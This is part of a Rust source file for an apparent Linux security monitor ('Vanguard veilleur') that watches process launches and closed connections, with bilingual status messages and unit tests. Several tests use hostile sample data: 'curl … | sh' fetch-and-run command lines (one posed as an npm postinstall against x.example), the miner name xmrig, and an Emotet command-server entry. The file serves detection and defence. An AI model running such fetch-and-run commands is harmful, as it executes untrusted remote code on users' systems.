                    "Ce noyau est plus ancien : il ne s'allumerait pas.",
                    "This kernel is older: it would not turn on."
                ));
            }
            ok(CAT, texte)
        }
        (false, true, _) => alerte(
            CAT,
            Niveau::Eleve,
            tr!(
                "Le veilleur que tu avais allumé n'est plus activé : son unité a été retirée ou désactivée. Une mise à jour du système peut l'avoir fait ; un logiciel malveillant aussi, qui coupe d'abord ce qui le surveille.",
                "The watcher you had turned on is no longer enabled: its unit was removed or disabled. A system update may have done it; so may malware, which first cuts what watches it."
            ),
        )
        .manuel(
            tr!(
                "Le rallumer : vanguard veilleur on ; si c'est toi qui l'as coupé, vanguard veilleur off pour que Vanguard l'oublie",
                "Turn it back on: vanguard watcher on; if you turned it off yourself, vanguard watcher off so Vanguard forgets it"
            ),
            &["vanguard veilleur on"],
        ),
        (true, _, Some(e)) => {
            let mut texte = trf!(
                "Veilleur allumé depuis le {} : {} lancement(s) vu(s), dont {} lu(s) en entier, {} par leur nom seul, {} parti(s) avant lecture (jamais comptés sains) et {} non lu(s) en rafale ; {} connexion(s) fermée(s).",
                "Watcher on since {}: {} launch(es) seen, of which {} read in full, {} by their name only, {} gone before reading (never counted safe) and {} not read in a burst; {} closed connection(s).",
                date(e.depuis),
                e.lancements,
                e.lus,
                e.noms_seuls,
                e.partis,
                e.non_lus,
                e.prises
            );
            let mut ajouter = |t: String| {
                texte.push(' ');
                texte.push_str(&t);
            };
            if e.en_pause {
                ajouter(
                    tr!(
                        "En pause : la protection en temps réel est coupée, rien n'est noté ni notifié.",
                        "Paused: real-time protection is off, nothing is noted or notified."
                    )
                    .to_string(),
                );
            }
            if e.perdus > 0 {
                ajouter(trf!(
                    "{} débordement(s) du tampon : des événements perdus, non vérifiés.",
                    "{} buffer overrun(s): events lost, not checked.",
                    e.perdus
                ));
            }
            if let Some(l) = &e.listes {
                ajouter(trf!(
                    "Connexions jugées en partie : {l}.",
                    "Connections partly judged: {l}."
                ));
            }
            if let Some(p) = &e.sans_prises {
                ajouter(trf!(
                    "Connexions fermées non vues : {p}",
                    "Closed connections not seen: {p}"
                ));
            }
            if e.masque {
                ajouter(
                    tr!(
                        "/proc ne montre que tes programmes (hidepid) : ceux des autres comptes comptent parmi les partis.",
                        "/proc only shows your programs (hidepid): those of other accounts count among the gone ones."
                    )
                    .to_string(),
                );
            }
            ok(CAT, texte)
        }
        (true, _, None) => {
            let raison = etat
                .and_then(|e| e.raison_arret.as_deref())
                .map(|r| format!(" ({r})"))
                .unwrap_or_default();
            Constat {
                verifie: false,
                ..alerte(
                    CAT,
                    Niveau::Moyen,
                    trf!(
                        "Veilleur allumé mais à l'arrêt{raison} : non vérifié, rien n'est vu en ce moment.",
                        "Watcher on but stopped{raison}: not checked, nothing is seen right now."
                    ),
                )
            }
            .manuel(
                tr!(
                    "Le relancer : vanguard veilleur on ; journalctl --user -u vanguard-veilleur dit pourquoi il s'est arrêté",
                    "Start it again: vanguard watcher on; journalctl --user -u vanguard-veilleur tells why it stopped"
                ),
                &["vanguard veilleur on"],
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use std::net::{Ipv4Addr, Ipv6Addr};

    // Les octets du noyau, écrits à la main dans l'ordre de cette machine.

    fn entete(longueur: usize, genre: u16) -> Vec<u8> {
        let mut o = Vec::new();
        o.extend_from_slice(&u32::try_from(longueur).unwrap().to_ne_bytes());
        o.extend_from_slice(&genre.to_ne_bytes());
        o.extend_from_slice(&[0; 10]);
        o
    }

    /// Un message du connecteur : cn_msg (idx, val, seq, ack, longueur) puis proc_event (what, cpu, horodatage,
    /// données de 24 octets).
    fn message_proc(idx: u32, seq: u32, ack: u32, what: u32, donnees: [u32; 6]) -> Vec<u8> {
        let mut corps = Vec::new();
        for v in [idx, CN_VAL_PROC, seq, ack] {
            corps.extend_from_slice(&v.to_ne_bytes());
        }
        corps.extend_from_slice(&40u16.to_ne_bytes());
        corps.extend_from_slice(&0u16.to_ne_bytes());
        corps.extend_from_slice(&what.to_ne_bytes());
        corps.extend_from_slice(&3u32.to_ne_bytes());
        corps.extend_from_slice(&123_456_789u64.to_ne_bytes());
        for v in donnees {
            corps.extend_from_slice(&v.to_ne_bytes());
        }
        let mut o = entete(16 + corps.len(), NLMSG_DONE);
        o.extend(corps);
        assert_eq!(o.len(), 76);
        o
    }

    #[test]
    fn accuse_de_notre_abonnement() {
        // Le seq de l'accusé est le compteur du noyau (0x10ca), pas le nôtre : seul ack = jeton + 1 compte.
        let jeton = 0x8000_1234;
        let o = message_proc(1, 0x10ca, jeton + 1, PROC_EVENT_NONE, [0; 6]);
        let e = lire_evenements_proc(&o);
        assert_eq!(
            e,
            [EvenementProc::Accuse {
                seq: 0x10ca,
                ack: jeton + 1,
                err: 0
            }]
        );
        assert_eq!(notre_accuse(&e[0], jeton), Some(0));
        let refuse = lire_evenements_proc(&message_proc(1, 7, jeton + 1, PROC_EVENT_NONE, [1, 0, 0, 0, 0, 0]));
        assert_eq!(notre_accuse(&refuse[0], jeton), Some(1));
        // L'accusé d'un autre abonné (ack = 1, ou un autre jeton) ne prouve rien.
        for ack in [1, jeton, jeton + 2] {
            let etranger = lire_evenements_proc(&message_proc(1, 0x10cb, ack, PROC_EVENT_NONE, [0; 6]));
            assert_eq!(notre_accuse(&etranger[0], jeton), None);
        }
        let lancement = lire_evenements_proc(&message_proc(1, 0, jeton + 1, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0]));
        assert_eq!(notre_accuse(&lancement[0], jeton), None);
        assert!(jeton_d_abonnement() >= 0x8000_0000 && jeton_d_abonnement() < u32::MAX);
    }

    #[test]
    fn fourche_lancement_fin_et_fils_ignores() {
        let fourche = message_proc(1, 0, 0, PROC_EVENT_FORK, [100, 100, 200, 200, 0, 0]);
        let fil = message_proc(1, 0, 0, PROC_EVENT_FORK, [100, 100, 201, 200, 0, 0]);
        let lancement = message_proc(1, 0, 0, PROC_EVENT_EXEC, [200, 200, 0, 0, 0, 0]);
        let fin = message_proc(1, 0, 0, PROC_EVENT_EXIT, [200, 200, 0, 17, 100, 100]);
        let fin_de_fil = message_proc(1, 0, 0, PROC_EVENT_EXIT, [201, 200, 0, 17, 100, 100]);
        assert_eq!(
            lire_evenements_proc(&fourche),
            [EvenementProc::Fourche {
                parent: 100,
                enfant: 200
            }]
        );
        assert_eq!(lire_evenements_proc(&fil), [EvenementProc::Autre]);
        assert_eq!(
            lire_evenements_proc(&lancement),
            [EvenementProc::Lancement { pid: 200 }]
        );
        assert_eq!(
            lire_evenements_proc(&fin),
            [EvenementProc::Fin {
                pid: 200,
                parent: Some(100),
                code: 0
            }]
        );
        assert_eq!(lire_evenements_proc(&fin_de_fil), [EvenementProc::Autre]);
    }

    #[test]
    fn plusieurs_messages_et_messages_abimes() {
        let mut tampon = message_proc(1, 0, 0, PROC_EVENT_EXEC, [1, 1, 0, 0, 0, 0]);
        tampon.extend(message_proc(1, 0, 0, PROC_EVENT_EXEC, [2, 2, 0, 0, 0, 0]));
        assert_eq!(
            lire_evenements_proc(&tampon),
            [EvenementProc::Lancement { pid: 1 }, EvenementProc::Lancement { pid: 2 }]
        );
        let bon = message_proc(1, 0, 0, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0]);
        // Tronqué : la longueur annoncée dépasse ce qui est là.
        assert_eq!(lire_evenements_proc(&bon[..60]), []);
        // Un autre connecteur (idx ≠ 1).
        assert_eq!(
            lire_evenements_proc(&message_proc(2, 0, 0, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0])),
            []
        );
        // Un autre type de message netlink.
        let mut autre = bon.clone();
        autre[4..6].copy_from_slice(&2u16.to_ne_bytes());
        assert_eq!(lire_evenements_proc(&autre), []);
        // Des données plus longues que le message.
        let mut trop = bon;
        trop[32..34].copy_from_slice(&200u16.to_ne_bytes());
        assert_eq!(lire_evenements_proc(&trop), []);
    }

    #[test]
    fn evenements_sans_interet() {
        for what in [4, 0x40, 0x200, 0x4000_0000] {
            assert_eq!(
                lire_evenements_proc(&message_proc(1, 0, 0, what, [5, 5, 0, 0, 0, 0])),
                [EvenementProc::Autre]
            );
        }
    }

    #[test]
    fn demandes_d_abonnement_exactes() {
        let ecouter = demande_abonnement(PROC_CN_MCAST_LISTEN, 0x0102_0304);
        let mut attendu = 40u32.to_ne_bytes().to_vec();
        attendu.extend_from_slice(&3u16.to_ne_bytes());
        attendu.extend_from_slice(&0u16.to_ne_bytes());
        for v in [0x0102_0304u32, 0, 1, 1, 0x0102_0304, 0x0102_0304] {
            attendu.extend_from_slice(&v.to_ne_bytes());
        }
        attendu.extend_from_slice(&4u16.to_ne_bytes());
        attendu.extend_from_slice(&0u16.to_ne_bytes());
        attendu.extend_from_slice(&1u32.to_ne_bytes());
        assert_eq!(ecouter.to_vec(), attendu);
        let ignorer = demande_abonnement(PROC_CN_MCAST_IGNORE, 0x0102_0304);
        assert_eq!(ignorer[..36], ecouter[..36]);
        assert_eq!(ignorer[36..], 2u32.to_ne_bytes());
    }

    /// Un message de sock_diag : inet_diag_msg (famille, état, ports, adresses…) puis, si `protocole`, l'attribut
    /// INET_DIAG_PROTOCOL.
    fn message_prise(famille: u8, locale: (&[u8], u16), distante: (&[u8], u16), protocole: Option<u8>) -> Vec<u8> {
        let mut corps = vec![0u8; 72];
        corps[0] = famille;
        corps[1] = 7;
        corps[4..6].copy_from_slice(&locale.1.to_be_bytes());
        corps[6..8].copy_from_slice(&distante.1.to_be_bytes());
        corps[8..8 + locale.0.len()].copy_from_slice(locale.0);
        corps[24..24 + distante.0.len()].copy_from_slice(distante.0);
        if let Some(p) = protocole {
            corps.extend_from_slice(&5u16.to_ne_bytes());
            corps.extend_from_slice(&INET_DIAG_PROTOCOL.to_ne_bytes());
            corps.extend_from_slice(&[p, 0, 0, 0]);
        }
        let mut o = entete(16 + corps.len(), SOCK_DIAG_BY_FAMILY);
        o.extend(corps);
        o
    }

    #[test]
    fn fins_de_prises() {
        let v4 = message_prise(AF_INET, (&[192, 168, 1, 10], 51000), (&[203, 0, 113, 7], 443), Some(6));
        assert_eq!(
            lire_fins_de_prises(&v4),
            [FinPrise {
                protocole: Some(6),
                locale: "192.168.1.10:51000".parse().unwrap(),
                distante: "203.0.113.7:443".parse().unwrap(),
                etat: 7,
            }]
        );
        let six: Ipv6Addr = "2001:db8::7".parse().unwrap();
        let v6 = message_prise(AF_INET6, (&[0; 16], 5353), (&six.octets(), 53), Some(17));
        let f = &lire_fins_de_prises(&v6)[0];
        assert_eq!((f.protocole, f.distante), (Some(17), SocketAddr::new(six.into(), 53)));
        let mappee: Ipv6Addr = "::ffff:198.51.100.9".parse().unwrap();
        let m = message_prise(AF_INET6, (&[0; 16], 1), (&mappee.octets(), 80), None);
        let f = &lire_fins_de_prises(&m)[0];
        assert_eq!(f.distante.ip(), IpAddr::V4(Ipv4Addr::new(198, 51, 100, 9)));
        assert_eq!(f.protocole, None);
        // Corps tronqué, famille inconnue : rien.
        assert_eq!(lire_fins_de_prises(&v4[..80]), []);
        assert_eq!(
            lire_fins_de_prises(&message_prise(1, (&[0; 4], 1), (&[0; 4], 1), None)),
            []
        );
    }

    proptest! {
        #[test]
        fn aucun_octet_ne_fait_planter(octets in prop::collection::vec(any::<u8>(), 0..400)) {
            let _ = lire_evenements_proc(&octets);
            let _ = lire_fins_de_prises(&octets);
        }

        #[test]
        fn aucun_corps_ne_fait_planter(corps in prop::collection::vec(any::<u8>(), 0..200), genre in prop_oneof![Just(3u16), Just(20u16)]) {
            let mut o = entete(16 + corps.len(), genre);
            o.extend(corps);
            let _ = lire_evenements_proc(&o);
            let _ = lire_fins_de_prises(&o);
        }
    }

    #[test]
    fn version_du_noyau() {
        assert_eq!(noyau_suffisant("6.5.13"), Some(false));
        assert_eq!(noyau_suffisant("6.6"), Some(true));
        assert_eq!(noyau_suffisant("6.10.2"), Some(true));
        assert_eq!(noyau_suffisant("7.2.8-9-omarchy"), Some(true));
        assert_eq!(noyau_suffisant("5.15.0-91-generic"), Some(false));
        assert_eq!(noyau_suffisant("abc"), None);
        assert_eq!(noyau_suffisant("6"), None);
    }

    #[test]
    fn lignes_de_commande() {
        assert_eq!(
            ligne_de_commande(b"sh\0-c\0curl x | sh\0").as_deref(),
            Some("sh -c curl x | sh")
        );
        assert_eq!(ligne_de_commande(b""), None);
        assert_eq!(ligne_de_commande(b"\0\0"), None);
    }

    const STATUS: &str = "Name:\tbash\nUmask:\t0022\nState:\tS (sleeping)\nTgid:\t200\nPid:\t200\nPPid:\t100\n";
    const ZOMBIE: &str = "Name:\txmrig\nState:\tZ (zombie)\nPPid:\t100\n";

    #[test]
    fn trois_lectures() {
        let complet = lecture_de(200, Some("/usr/bin/bash".into()), Some(b"bash\0-l\0"), Some(STATUS));
        let Lecture::Complet(p) = complet else {
            panic!("{complet:?}")
        };
        assert_eq!(
            (p.nom.as_str(), p.parent, p.chemin.as_deref(), p.ligne.as_deref()),
            ("bash", Some(100), Some("/usr/bin/bash"), Some("bash -l"))
        );
        let efface = lecture_de(200, Some("/tmp/x (deleted)".into()), None, Some(STATUS));
        assert!(matches!(efface, Lecture::Complet(ref p) if p.sans_fichier && p.chemin.as_deref() == Some("/tmp/x")));
        // Un zombie ne donne plus que son nom, même si une ligne traînait.
        let zombie = lecture_de(201, None, Some(b""), Some(ZOMBIE));
        assert!(matches!(zombie, Lecture::NomSeul(ref p) if p.nom == "xmrig" && p.parent == Some(100)));
        assert!(matches!(lecture_de(202, None, None, None), Lecture::Parti));
        // Un autre compte : la ligne sans le programme.
        let autre = lecture_de(203, None, Some(b"/usr/bin/sleep\x0030\0"), None);
        assert!(matches!(autre, Lecture::Complet(ref p) if p.nom == "sleep" && p.chemin.is_none()));
    }

    fn en_marche(pid: u32, nom: &str, ligne: Option<&str>) -> EnMarche {
        EnMarche {
            pid,
            parent: Some(1),
            nom: nom.into(),
            chemin: None,
            ligne: ligne.map(str::to_string),
            ..EnMarche::default()
        }
    }

    fn lance(lecture: Lecture, lignee: &[&str], de_vanguard: bool) -> Lance {
        Lance {
            pid: 300,
            parent: Some(299),
            lecture,
            lignee: lignee.iter().map(|n| (*n).to_string()).collect(),
            de_vanguard,
        }
    }

    #[test]
    fn jugement_des_lancements() {
        // Le nom court seul : un outil offensif connu ressort quand même, et c'est dit.
        let a = juger_lance(&lance(
            Lecture::NomSeul(en_marche(300, "xmrig", None)),
            &["xmrig"],
            false,
        ))
        .unwrap();
        assert!(a.grave && a.genre == Genre::Veilleur, "{a:?}");
        assert!(a.texte.contains("Nom court du noyau seulement"), "{}", a.texte);
        // Le postinstall de npm qui télécharge et lance un script.
        let postinstall = en_marche(300, "sh", Some("sh -c curl https://x.example/a | sh"));
        let a = juger_lance(&lance(
            Lecture::Complet(postinstall.clone()),
            &["npm", "node", "sh"],
            false,
        ))
        .unwrap();
        assert!(a.grave, "{a:?}");
        assert!(a.texte.contains("npm → node → sh"), "{}", a.texte);
        // Rien de suspect, Vanguard lui-même, ou rien de lu : aucune alerte.
        assert_eq!(
            juger_lance(&lance(
                Lecture::Complet(en_marche(300, "ls", Some("ls -l"))),
                &["bash", "ls"],
                false
            )),
            None
        );
        assert_eq!(
            juger_lance(&lance(Lecture::Complet(postinstall), &["vanguard", "sh"], true)),
            None
        );
        assert_eq!(juger_lance(&lance(Lecture::Parti, &[], false)), None);
        assert_eq!(juger_lance(&lance(Lecture::NonLu, &[], false)), None);
    }

    #[test]
    fn jugement_des_connexions() {
        let liste = ServeursDeCommande::pour_essai(&[], &[("203.0.113.7".parse().unwrap(), 443, "Emotet")]);
        let fin = |distante: &str| FinPrise {
            protocole: Some(6),
            locale: "192.168.1.10:51000".parse().unwrap(),
            distante: distante.parse().unwrap(),
            etat: 7,
        };
        let a = juger_prise(&fin("203.0.113.7:443"), &liste).unwrap();
        assert!(
            a.grave && a.genre == Genre::Botnet && a.texte.contains("Emotet"),
            "{a:?}"
        );
        assert!(a.texte.contains("TCP"), "{}", a.texte);
        assert_eq!(juger_prise(&fin("203.0.113.7:80"), &liste), None);
        assert_eq!(juger_prise(&fin("127.0.0.1:443"), &liste), None);
    }

    #[test]
    fn table_bornee_et_lignee() {
        let tous = |_: u32| true;
        let mut t = Table::default();
        t.inserer(1, None, "systemd", false, &tous);
        t.fourche(1, 10, &tous);
        let npm = en_marche(10, "npm", None);
        t.lancement(10, Some(&EnMarche { parent: Some(1), ..npm }), false, &tous);
        t.fourche(10, 11, &tous);
        t.lancement(
            11,
            Some(&EnMarche {
                parent: Some(10),
                ..en_marche(11, "node", None)
            }),
            false,
            &tous,
        );
        t.fourche(11, 12, &tous);
        t.lancement(
            12,
            Some(&EnMarche {
                parent: Some(11),
                ..en_marche(12, "sh", None)
            }),
            false,
            &tous,
        );
        assert_eq!(t.lignee(12), ["systemd", "npm", "node", "sh"]);
        t.fourche(12, 13, &tous);
        t.lancement(
            13,
            Some(&EnMarche {
                parent: Some(12),
                ..en_marche(13, "curl", None)
            }),
            false,
            &tous,
        );
        assert_eq!(t.lignee(13), ["npm", "node", "sh", "curl"], "quatre au plus");
        // Une boucle de parents s'arrête.
        t.inserer(20, Some(21), "a", false, &tous);
        t.inserer(21, Some(20), "b", false, &tous);
        assert_eq!(t.lignee(20), ["b", "a"]);
        // Vanguard et sa descendance.
        t.inserer(30, Some(1), "vanguard", true, &tous);
        t.fourche(30, 31, &tous);
        t.lancement(31, Some(&en_marche(31, "notify-send", None)), false, &tous);
        assert!(t.de_vanguard(31) && !t.de_vanguard(12));
        // La fin vide la fiche.
        t.fin(13);
        assert!(!t.fiches.contains_key(&13));
        // Bornée : les disparus d'abord, puis les plus anciens.
        let mut t = Table::default();
        for pid in 0..u32::try_from(TABLE_MAX + 50).unwrap() {
            t.inserer(pid, None, "x", false, &tous);
        }
        assert!(t.fiches.len() <= TABLE_MAX);
        assert!(t.ordre.len() <= 2 * TABLE_MAX + 1);
        assert!(!t.fiches.contains_key(&0) && t.fiches.contains_key(&u32::try_from(TABLE_MAX + 49).unwrap()));
        let pairs = |p: u32| p.is_multiple_of(2);
        t.inserer(u32::MAX, None, "y", false, &pairs);
        assert!(t.fiches.len() < TABLE_MAX / 2 + 10);
        // Un nom fabriqué est borné.
        t.inserer(5, None, "ééééééééééééééééé", false, &tous);
        assert!(t.fiches[&5].nom.len() <= NOM_MAX);
    }

    #[test]
    fn debit_borne() {
        let mut d = Debit::default();
        let t0 = 1_800_000_000;
        assert_eq!(d.decider("a", true, t0), Decision::Noter { notifier: true });
        assert_eq!(d.decider("a", true, t0 + 3600), Decision::Repete);
        assert_eq!(
            d.decider("a", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        // Trois notifications par tranche de 10 minutes : les autres sont notées sans notification.
        assert_eq!(
            d.decider("b", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        assert_eq!(
            d.decider("c", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        assert_eq!(
            d.decider("d", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: false }
        );
        assert_eq!(
            d.decider("e", false, t0 + REDIRE_APRES + 700),
            Decision::Noter { notifier: false }
        );
        assert_eq!(
            d.decider("f", true, t0 + REDIRE_APRES + 700),
            Decision::Noter { notifier: true }
        );
        // Dix par heure au journal : 1 (t0) + 6 dans cette heure-ci, puis 4 de plus, puis plus rien.
        let h = t0 + REDIRE_APRES + 800;
        for i in 0..4 {
            assert!(matches!(d.decider(&format!("g{i}"), false, h), Decision::Noter { .. }));
        }
        assert_eq!(d.decider("trop", false, h), Decision::Taire);
        // Le résumé : une fois, puis plus avant une heure.
        assert_eq!(d.resume(h), Some(1));
        assert_eq!(d.decider("trop2", false, h + 10), Decision::Taire);
        assert_eq!(d.resume(h + 10), None);
        assert_eq!(d.resume(h + 3600), Some(1));
        assert_eq!(d.resume(h + 7200), None);
        // Vingt par jour : l'heure suivante en note encore 9, puis plus rien jusqu'au lendemain.
        let h2 = h + 3600;
        let notees = (0..15)
            .filter(|i| matches!(d.decider(&format!("j{i}"), false, h2), Decision::Noter { .. }))
            .count();
        assert_eq!(notees, 20 - 11);
        assert_eq!(
            d.decider("lendemain", false, t0 + REDIRE_APRES + 86_400 + 900),
            Decision::Noter { notifier: false }
        );
        // Les clés gardées sont bornées.
        for i in 0..(DEJA_MAX + 10) {
            let _ = d.decider(&format!("k{i}"), false, h2 + 1);
        }
        assert!(d.deja.len() <= DEJA_MAX);
    }

    fn etat_vivant() -> Etat {
        Etat {
            pid: 42,
            depuis: 1_800_000_000,
            battement: 1_800_000_000,
            lancements: 120,
            lus: 110,
            noms_seuls: 4,
            partis: 6,
            ..Etat::default()
        }
    }

    #[test]
    fn cinq_etats_au_bilan() {
        let e = etat_vivant();
        let sans_systemd = juger_etat(false, None, None, false, Some(true));
        assert!(!sans_systemd.verifie);
        let coupe = juger_etat(false, Some(false), None, false, Some(false));
        assert!(
            coupe.verifie && coupe.probleme.is_none() && coupe.message.contains("plus ancien"),
            "{}",
            coupe.message
        );
        let disparu = juger_etat(true, Some(false), None, false, Some(true));
        assert_eq!(disparu.probleme, Some(Niveau::Eleve));
        let allume = juger_etat(true, Some(true), Some(&e), true, Some(true));
        assert!(allume.verifie && allume.probleme.is_none(), "{}", allume.message);
        assert!(
            allume
                .message
                .contains("6 parti(s) avant lecture (jamais comptés sains)"),
            "{}",
            allume.message
        );
        let en_pause = Etat {
            en_pause: true,
            listes: Some("liste de ThreatFox non vérifiée".into()),
            ..e.clone()
        };
        let pause = juger_etat(true, Some(true), Some(&en_pause), true, Some(true));
        assert!(
            pause.message.contains("En pause") && pause.message.contains("ThreatFox"),
            "{}",
            pause.message
        );
        let arrete = Etat {
            raison_arret: Some("erreur de lecture du noyau".into()),
            ..e
        };
        let a_l_arret = juger_etat(true, Some(true), Some(&arrete), false, Some(true));
        assert!(!a_l_arret.verifie && a_l_arret.probleme == Some(Niveau::Moyen));
        assert!(a_l_arret.message.contains("erreur de lecture"), "{}", a_l_arret.message);
        assert!(a_l_arret.correctif.is_some());
    }

    #[test]
    fn precisions_du_menu() {
        for (activee, vivant, pause) in [
            (Some(true), true, true),
            (Some(true), true, false),
            (Some(true), false, false),
            (Some(false), false, false),
            (None, false, true),
        ] {
            assert!(crate::ui::largeur_affichee(precision_de(activee, vivant, pause)) <= 33);
        }
        assert_eq!(precision_de(Some(false), false, true), "coupé");
        assert_eq!(precision_de(Some(true), false, true), "allumé, à l'arrêt");
    }

    #[test]
    fn unite_durcie_et_compatible() {
        for anglais in [false, true] {
            let u = unite_dans("/home/alice/mes 100%/vanguard\"x", anglais);
            assert!(notre_unite(&u), "{u}");
            assert!(u.contains("\nType=simple\n"));
            assert!(
                u.contains("\nExecStart=\"/home/alice/mes 100%%/vanguard\\\"x\" veilleur --servir\n"),
                "{u}"
            );
            assert!(u.contains("\nRestartPreventExitStatus=77\n"));
            // Le programme lance un environnement tokio d'un fil par cœur (16 ici, mesuré : 17 fils en tout) :
            // au-delà de TasksMax, notify-send ne partirait plus.
            assert!(u.contains("\nEnvironment=TOKIO_WORKER_THREADS=1\n") && u.contains("\nTasksMax=16\n"));
            assert!(u.contains("\nRestart=on-failure\n"));
            assert!(u.contains("\nNoNewPrivileges=yes\n"));
            assert!(u.contains("\nRestrictAddressFamilies=AF_UNIX AF_NETLINK\n"));
            assert!(u.contains("\nWantedBy=default.target\n"));
            // Montrée avant l'accord avec un retrait de 4 : tout tient dans 76 colonnes, sauf le chemin du programme.
            for l in u.lines().filter(|l| !l.starts_with("ExecStart=")) {
                assert!(crate::ui::largeur_affichee(l) <= crate::ui::LARGEUR - 4, "{l}");
            }
            for l in u.lines().filter(|l| !l.starts_with('#')) {
                for interdite in [
                    "ProtectSystem",
                    "ProtectHome",
                    "PrivateTmp",
                    "PrivateUsers",
                    "ReadOnlyPaths",
                    "ReadWritePaths",
                    "Protect",
                    "PrivateDevices",
                    "PrivateIPC",
                    "PrivateMounts",
                    "Nice",
                ] {
                    assert!(!l.starts_with(interdite), "{l}");
                }
            }
        }
        assert_ne!(unite_dans("/x", false), unite_dans("/x", true));
    }

    #[test]
    fn retrait_seulement_de_notre_unite() {
        assert!(notre_unite(&unite_dans("/x", false)));
        assert!(notre_unite(&unite_dans("/x", true)));
        assert!(!notre_unite(
            "[Unit]\nDescription=Autre\n# Posé par Vanguard (vanguard veilleur on)\n"
        ));
        assert!(!notre_unite(""));
    }

    /// Sur le vrai noyau : un programme d'une milliseconde et une connexion brève vers la machine elle-même, vus par
    /// le veilleur et manqués par la passe horaire. Sans connecteur ouvert aux comptes ordinaires (espace de noms de
    /// `unshare -rn`, conteneur, noyau plus ancien), l'essai se dit sauté, rien de vérifié ; avec
    /// VANGUARD_EXIGER_VEILLEUR=1, ce même échec fait échouer le test, pour prouver ici qu'il a vraiment tourné.
    #[test]
    fn voit_un_lancement_bref_et_une_connexion_breve() {
        let exige = std::env::var_os("VANGUARD_EXIGER_VEILLEUR").is_some_and(|v| v == "1");
        let mut v = match Veilleur::ouvrir() {
            Ok(v) => v,
            Err(refus) => {
                assert!(!exige, "veilleur : {} (VANGUARD_EXIGER_VEILLEUR=1)", refus.raison());
                eprintln!("veilleur : {} : essai SAUTÉ, rien de vérifié", refus.raison());
                return;
            }
        };
        assert!(v.prises.is_ok(), "fins de prises : {:?}", v.prises.as_ref().err());
        let marque = format!("--vanguard-essai-{}", std::process::id());
        let ecoute = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = ecoute.local_addr().unwrap().port();
        let mut lance_vu: Option<Lance> = None;
        let mut prise_vue = false;
        let mut partis = 0;
        // Le programme est lancé depuis un autre fil pendant que celui-ci écoute, comme le service tourne pendant que
        // les autres programmes vivent : `commande::lancer` attend la fin du programme et le ramasse, et lu après
        // lui, il serait toujours parti. Trois essais au plus : un programme d'une milliseconde peut partir avant
        // d'être lu, ce qui est compté « parti » et ne prouverait pas qu'on l'a reconnu.
        for _ in 0..3 {
            let ecoute = ecoute.try_clone().unwrap();
            let marque_du_fil = marque.clone();
            let fil = std::thread::spawn(move || {
                std::thread::sleep(Duration::from_millis(150));
                let r = crate::commande::lancer(std::process::Command::new("/bin/true").arg(&marque_du_fil), 10);
                let client = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
                let (servi, _) = ecoute.accept().unwrap();
                drop(client);
                drop(servi);
                r.is_some_and(|r| r.code == Some(0))
            });
            let limite = Instant::now() + Duration::from_secs(5);
            while Instant::now() < limite && (lance_vu.is_none() || !prise_vue) {
                for vu in v.tour(Duration::from_millis(100)).unwrap() {
                    match vu {
                        Vu::Lance(l) if l.parent == Some(std::process::id()) => match &l.lecture {
                            Lecture::Complet(p) if p.ligne.as_deref().is_some_and(|x| x.contains(&marque)) => {
                                lance_vu = Some(l);
                            }
                            Lecture::Parti => partis += 1,
                            _ => {}
                        },
                        Vu::Prise(f) if f.locale.port() == port || f.distante.port() == port => prise_vue = true,
                        _ => {}
                    }
                }
            }
            assert!(fil.join().unwrap(), "/bin/true n'a pas réussi");
            if lance_vu.is_some() && prise_vue {
                break;
            }
        }
        let l = lance_vu.expect("/bin/true lancé, jamais vu en entier par le veilleur");
        assert!(prise_vue, "connexion brève vers 127.0.0.1:{port} jamais vue fermée");
        assert!(
            !l.de_vanguard || l.lignee.iter().any(|n| n.contains("vanguard")),
            "{l:?}"
        );
        let pid = l.pid;
        eprintln!(
            "veilleur : /bin/true (PID {pid}, lu en entier, lignée {}) et la connexion vers 127.0.0.1:{port} vus ; {partis} lancement(s) du test partis avant lecture",
            l.lignee.join(" → ")
        );
        // La passe horaire, elle, ne le voit plus : il est parti.
        let (liste, _) = chasse::en_marche().unwrap();
        assert!(!liste.iter().any(|p| p.pid == pid));
    }
}
